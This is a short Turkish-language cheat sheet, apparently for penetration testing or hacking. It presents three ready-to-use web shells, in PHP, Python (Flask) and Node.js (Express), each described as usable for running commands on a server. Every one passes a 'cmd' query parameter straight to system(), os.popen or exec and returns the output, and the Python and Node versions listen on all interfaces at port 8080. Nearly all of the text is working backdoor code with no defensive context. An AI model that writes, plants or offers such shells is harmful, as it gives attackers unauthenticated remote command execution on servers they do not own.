### Basit Shell Kodları

PHP

PHP için basit bir web shell, sunucuda komut çalıştırmak için kullanılabilir:

```auto
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Python

Python için basit bir web shell, sunucuda komut çalıştırmak için kullanılabilir:

```auto
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/shell', methods=['GET'])
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        output = os.popen(cmd).read()
        return f"<pre>{output}</pre>"
    return "<pre>No command provided</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Node.js

Node.js için basit bir web shell, sunucuda komut çalıştırmak için kullanılabilir:

```auto
const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/shell', (req, res) => {
  const cmd = req.query.cmd;
  if (cmd) {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        res.send(`<pre>${stderr}</pre>`);
        return;
      }
      res.send(`<pre>${stdout}</pre>`);
    });
  } else {
    res.send('<pre>No command provided</pre>');
  }
});

app.listen(8080, '0.0.0.0', () => {
  console.log('Web shell running on port 8080');
});
```
